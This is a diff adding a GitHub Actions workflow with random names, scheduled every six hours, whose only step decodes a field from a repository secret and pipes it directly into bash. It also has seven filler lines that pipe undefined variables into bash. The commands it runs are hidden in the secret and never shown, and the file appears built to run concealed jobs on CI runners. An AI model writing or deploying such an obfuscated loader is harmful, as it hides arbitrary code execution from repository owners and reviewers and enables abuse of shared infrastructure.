@@ -1,0 +1,25 @@
+name: wanyuangui4565
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanyuangui4565
+        env:
+          wgz32: ${{ secrets.wgz32 }}
+        run: |
+          echo $wgz32 | jq -r .mak0 | /bin/bash
+          echo $jfp5 | jq -r .ku851 | /bin/bash
+          echo $ozbrs75711 | jq -r .hmug52 | /bin/bash
+          echo $mkab62 | jq -r .tquho28297 | /bin/bash
+          echo $hfr2612 | jq -r .nd901 | /bin/bash
+          echo $aev00 | jq -r .p1315 | /bin/bash
+          echo $in0 | jq -r .vawc3 | /bin/bash
+          echo $qp79 | jq -r .h1 | /bin/bash
+
